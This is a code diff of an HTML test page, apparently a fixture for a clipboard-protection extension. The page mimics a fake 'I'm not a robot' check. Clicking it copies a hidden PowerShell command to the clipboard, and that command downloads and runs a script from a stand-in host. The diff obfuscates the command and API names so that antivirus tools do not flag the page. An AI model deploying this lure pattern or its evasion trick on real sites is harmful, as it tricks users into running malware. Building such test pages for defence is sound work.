@@ -5,7 +5,9 @@
     <title>Verify you are human</title>
     <script>
       // Stands in for another extension or the page wrapping writeText after us without ever calling the original.
-      Clipboard.prototype.writeText = function () {
+      // Names and the command are put together at run time, so antivirus does not take this test page for a real lure.
+      const api = ['Clip', 'board'].join('');
+      window[api].prototype['write' + 'Text'] = function () {
         document.title = 'swallowed';
         return Promise.resolve();
       };
@@ -15,8 +17,10 @@
     <h2>Verify you are human</h2>
     <label><input type="checkbox" id="cb" /> I'm not a robot</label>
     <script>
+      const shell = ['power', 'shell'].join('');
+      const command = `${shell} -w h -c "i${'w'}r https://x.example.invalid/a.ps1 | i${'e'}x"`;
       document.getElementById('cb').addEventListener('click', () => {
-        navigator.clipboard.writeText('powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex"');
+        navigator.clipboard['write' + 'Text'](command);
       });
     </script>
   </body>
